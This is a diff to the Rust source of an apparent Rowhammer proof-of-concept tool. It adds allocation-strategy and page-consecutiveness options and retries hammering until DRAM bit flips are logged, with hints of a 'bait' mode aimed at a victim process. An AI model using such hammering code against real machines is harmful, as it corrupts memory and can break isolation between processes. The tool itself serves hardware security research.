@@ -15,8 +15,10 @@ use anyhow::{bail, Context};
 use bs_poc::{
     forge::{FuzzSummary, Hammerer, Hammering, HammeringPattern, PatternAddressMapper},
     jitter::AggressorPtr,
-    memory::{BlockMemory, DRAMAddr, LinuxPageMap, VirtToPhysResolver},
-    util::{retry, BlacksmithConfig, MemConfiguration, KNOWN_BITS, PAGE_SIZE},
+    memory::{
+        ConsecAlloc, ConsecAllocator, ConsecCheck, DRAMAddr, LinuxPageMap, VirtToPhysResolver,
+    },
+    util::{retry, BlacksmithConfig, MemConfiguration, PAGE_SIZE},
     victim::{HammerVictim, HammerVictimMemCheck},
 };
 use clap::Parser;
@@ -41,6 +43,10 @@ struct CliArgs {
     /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
     #[clap(long = "mapping")]
     mapping: Option<String>,
+    #[clap(long = "consec-check", default_value = "pfn")]
+    consec_check: ConsecCheck,
+    #[clap(long = "alloc-strategy", default_value = "hugepage")]
+    alloc_strategy: ConsecAlloc,
 }
 
 #[derive(clap::ValueEnum, Clone, Debug)]
@@ -118,6 +124,8 @@ unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
     let mem_config =
         MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
 
+    let checker = args.consec_check;
+
     const BASE_MSB: *const u8 = 0x2000000000 as *const u8;
 
     // load patterns from JSON
@@ -135,7 +143,11 @@ unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
     };
 
     info!("Using mapping {}", mapping.id);
-    debug!("{:?}", mapping);
+    let max_flips = mapping.bit_flips.iter().map(|f| f.len()).max().unwrap();
+    info!("Max flips: {:?}", max_flips);
+    if max_flips == 0 {
+        bail!("No flips in mapping");
+    }
 
     // find offset from base and mapping start
     let mapping_base = find_mapping_base(mapping.clone(), mem_config, BASE_MSB as *const u8);
@@ -189,39 +201,53 @@ unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
     //while let Some((base, _)) = cur {
 
     // get mapping size, round to nearest multiple of PAGE_SIZE
-    let num_sets = mapping.aggressor_sets(mem_config, KNOWN_BITS).len();
-    let memory = BlockMemory::new(num_sets * (1usize << KNOWN_BITS))?;
-    let hammering_addrs = mapping.get_hammering_addresses_relocate(
-        &pattern.access_ids,
-        mem_config,
-        KNOWN_BITS,
-        &memory.blocks,
-    )?;
+    let block_size = args.alloc_strategy.block_size();
+    let block_shift = block_size.ilog2() as usize;
+    let num_sets = mapping.aggressor_sets(mem_config, block_shift).len();
+    loop {
+        let memory = args
+            .alloc_strategy
+            .alloc_consec_blocks(num_sets * block_size, &checker)?;
+        let hammering_addrs = mapping.get_hammering_addresses_relocate(
+            &pattern.access_ids,
+            mem_config,
+            block_shift,
+            &memory.blocks,
+        )?;
 
-    let hammerer = Hammerer::new(
-        mem_config,
-        pattern.clone(),
-        mapping.clone(),
-        &hammering_addrs,
-        &memory.blocks,
-    )?;
-    // let hammerer = DummyHammerer::new(memory.addr(0), 0x42);
-    let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);
+        let hammerer = Hammerer::new(
+            mem_config,
+            pattern.clone(),
+            mapping.clone(),
+            &hammering_addrs,
+            &memory.blocks,
+        )?;
+        // let hammerer = DummyHammerer::new(memory.addr(0), 0x42);
+        let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);
 
-    info!("Hammering pattern. This will take a while...");
-    let res = hammerer.hammer(&mut victim);
-    print!("{:?}", res);
-    victim.log_report(BASE_MSB as AggressorPtr);
+        info!("Hammering pattern. This will take a while...");
+        let res = hammerer.hammer(&mut victim, 1);
+        match res {
+            Ok(res) => {
+                print!("{:?}", res);
+                victim.log_report(BASE_MSB as AggressorPtr);
+            }
+            Err(e) => {
+                println!("Hammering not successful: {:?}", e);
+                continue;
+            }
+        }
 
-    // signal child process
-    //signal("INT", child.id())?;
-    //let _output = child.wait_with_output().expect("child wait");
-    //thread::sleep(std::time::Duration::from_secs(2));
+        // signal child process
+        //signal("INT", child.id())?;
+        //let _output = child.wait_with_output().expect("child wait");
+        //thread::sleep(std::time::Duration::from_secs(2));
 
-    // cleanup
-    //libc::munmap(v as *mut c_void, 2 * MB);
-    // TODO munmap all allocation
-    return Ok(());
+        // cleanup
+        //libc::munmap(v as *mut c_void, 2 * MB);
+        // TODO munmap all allocation
+        return Ok(());
+    }
 }
 
 // TODO entweder malloc arena vergiften oder viel speicher alloziieren und wenig freigeben
